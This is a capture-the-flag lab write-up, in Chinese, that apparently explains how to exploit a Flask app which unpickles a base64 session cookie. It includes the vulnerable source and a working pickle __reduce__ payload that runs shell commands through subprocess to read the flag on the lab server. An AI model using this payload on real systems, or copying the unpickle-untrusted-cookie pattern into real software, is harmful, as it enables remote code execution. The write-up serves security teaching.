# LAB - Pickle
###### tags: `資安` `Web`

## 題目解析
畫面中可以看到有 Name 跟 Age 的輸入框，點底下那行字可以看到網頁 source code。

![](https://i.imgur.com/x4uo03c.png)
``` python
from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route("/sauce")
def sauce():
    return send_file(__file__, mimetype="text/plain")


@app.route("/")
def main():
    session = request.cookies.get("session")
    if session == None:
        return '<form action="/login" method="POST">' +\
            '<p>Name: <input name="name" type="text"></p>' +\
            '<p>Age: <input name="age" type="number"></p>' +\
            '<button>Submit</button></form><hr><a href="/sauce">Source code</a>'

    else:
        user = pickle.loads(base64.b64decode(session))
        return f'<p>Name: {user["name"]}</p><p>Age: {user["age"]}</p>'


@app.route("/login", methods=['POST'])
def login():
    user = base64.b64encode(pickle.dumps({
        "name": request.form.get('name'),
        "age": int(request.form.get('age'))
    }))
    resp = make_response(redirect('/'))
    resp.set_cookie("session", user)
    return resp
```

## 解題流程
可以從 source code 看到如果你沒有 cookie 就會讓你輸入 Name 跟 Age 並 POST 到 login 頁面，login 頁面會顯示你的輸入然後做 pickle 序列化轉 base64 存成 id 為 "session" 的 cookie。

若你有 cookie 就會讀值過 base64 decode 然後 pickle 反序列化顯示用戶資訊，而這邊就能利用 pickle 反序列化漏洞來做惡意 payload 的植入。

pickle 在反序列化會自動去執行 \_\_reduce\_\_() 的 magic function，因此我們只要 create 一個 class 並宣告 \_\_reduce\_\_()，按照 \_\_reduce\_\_() 格式規定 return (object, (argv ...)) (雙 tuple)，就能做我們想做的事。

這邊就直接用 subprocess 接收字符串命令並返回結果，將我們想做的指令跟 age 一起打包做 pickle 序列化和 base64 encode，當成 cookie 內容傳給 server，server 會自動做 base64 decode 和 pickle 反序列化，就會自行執行 subprocess.getoutput(指令)，先用 ls 試有沒有成功，成功後稍微試一下就看到 FLAG 放在根目錄。
```python
import pickle
import os
import base64
import pty

command = 'cd /; cat flag_5fb2acebf1d0c558'

class exp:
    def __reduce__(self):
        return (__import__('subprocess').getoutput, (command, ))
    
cookie = base64.b64encode(pickle.dumps({"age":1, "name":exp()})).decode()
os.system(f"curl http://h4ck3r.quest:8600/ --cookie 'session={cookie}'")
```
## FLAG 截圖
![](https://i.imgur.com/WpbXVUU.png)
